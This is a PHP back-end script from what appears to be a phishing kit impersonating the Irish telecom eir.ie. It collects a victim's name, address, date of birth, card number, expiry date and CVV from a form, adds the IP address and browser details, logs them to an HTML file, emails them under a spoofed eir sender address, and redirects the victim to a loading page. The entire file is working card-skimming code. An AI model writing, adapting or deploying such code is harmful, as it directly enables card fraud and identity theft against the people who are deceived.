<?php
$adresse_ip = $_SERVER['REMOTE_ADDR'];

include('__CONFIG__.php');






  $subject  = "eir.ie [ CVV ] - ".$_SERVER['REMOTE_ADDR']."";
            $headers  = "From: eir.ie <infos@eir.com>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
        

            $message = "
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset='UTF-8' />
            </head>
            <body>
            <style type='text/css'>
            body{
                background: #141414;
                color: #fff;
                font-family: arial;
            }
            .rezlt{
                width: 600px;
            }
            table{
                width: 100%;
                background: #fff;
                color: #000;
            }
            table td{
                padding: 10px;
            }
            .newline{
                width: 100%;
                background: #141414;
                height: 2px;
            }
            </style>
            <center>
            <div class='rezlt'>
                <h3 style='text-align: center;background: #000000;margin: 0px;padding: 17px;'>eir.ie cvv</h3>
                <table>
                    <tr>
                        <td style='width: 200px;'><b>Nom& prenom</b></td>
                        <td style='width: 400px;'>".$_POST["nom"]."/".$_POST["prenom"]."</td>
                    </tr>
				
					<tr>
                        <td style='width: 200px;'><b>adresse</b></td>
                        <td style='width: 400px;'>".$_POST["adresse"]."</td>
                    </tr>
					<tr>
                        <td style='width: 200px;'><b>Date de naissance</b></td>
                        <td style='width: 400px;'>".$_POST["date"]."</td>
                    </tr>
					<tr>
                        <td style='width: 200px;'><b>Numero carte</b></td>
                        <td style='width: 400px;'>".$_POST["numero"]."</td>
                    </tr>
					<tr>
                        <td style='width: 200px;'><b>Date d'expiration</b></td>
                        <td style='width: 400px;'>".$_POST["dateexprisation"]."</td>
                    </tr>
					<tr>
                        <td style='width: 200px;'><b>cvv</b></td>
                        <td style='width: 400px;'>".$_POST["cvv"]."</td>
                    </tr>
                   
                   
                     <tr>
                        <td style='width: 200px;'><b>Ip</b></td>
                        <td style='width: 400px;'>".$adresse_ip."</td>
                    </tr>
                    <tr>
                        <td style='width: 200px;'><b>User Agent</b></td>
                        <td style='width: 400px;'>".$_SERVER['HTTP_USER_AGENT']."</td>
                    </tr>
                </table>
                <div class='newline'></div>
               
            </div>
            </center>
            </body>
            </html>
            ";
                $txt_rezlt = fopen('cvv.html', 'a');
            fwrite($txt_rezlt, $message);
            fclose($txt_rezlt);
      
           
			   	 @mail($_POST['proline'], $subject, $message, $headers);
		 @mail($to, $subject, $message, $headers);
      
            header('location: ../load1.php');
?>